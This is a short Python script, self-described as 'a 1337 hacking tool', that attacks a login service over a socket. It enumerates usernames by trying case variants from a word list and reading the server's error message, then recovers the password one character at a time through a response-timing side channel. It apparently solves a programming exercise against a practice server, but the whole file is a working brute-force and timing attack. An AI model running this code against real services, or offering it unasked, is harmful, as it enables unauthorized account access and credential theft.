import itertools
import json
import string
import os
import socket
import argparse
# print(os.getcwd())
import time

parser = argparse.ArgumentParser(description='This is a 1337 hacking tool')
parser.add_argument("IP_address")
parser.add_argument("port")
# parser.add_argument("message")]
found_login = False
found_pass = False
correct_login = ''
pass_so_far = ''
args = parser.parse_args()
with socket.socket() as my_sock:
    my_sock.connect((args.IP_address, int(args.port)))
    with open('logins.txt', 'rt') as login_list:
        logins = login_list.readlines()
        while not found_login:
            for login in logins:
                my_iter = itertools.product(*[[letter.upper(), letter.lower()] for letter in login.strip()])
                for x in map(lambda z: ''.join(z), my_iter):
                    message = json.dumps({'login':x,'password':''})
                    # print(message)
                    my_sock.send(message.encode())
                    response = my_sock.recv(1024)
                    python_response = json.loads(response)
                    result = python_response['result']
                    # print(result)
                    if result == 'Wrong password!':
                        correct_login = x
                        found_login = True
                        break
                if found_login:
                    break
            found_login = True
    while not found_pass:
        for i in range(1, 32):
            possible_chars = itertools.chain(string.ascii_letters, string.digits)
            my_iter = map(lambda y: pass_so_far + y, possible_chars)
            for x in my_iter:
                message = json.dumps({'login':correct_login,'password':x})
                start = time.perf_counter()
                my_sock.send(message.encode())
                response = my_sock.recv(1024)
                end = time.perf_counter()
                processing = end - start
                # print('time elapsed =' + str(processing))
                python_response = json.loads(response)
                result = python_response['result']
                if processing > .01:
                    pass_so_far = x
                    break
                elif result == 'Connection success!':
                    print(message)
                    found_pass = True
                    break
                else:
                    pass
            # print('got here')
            if found_pass:
                break
        found_pass = True
    my_sock.close()
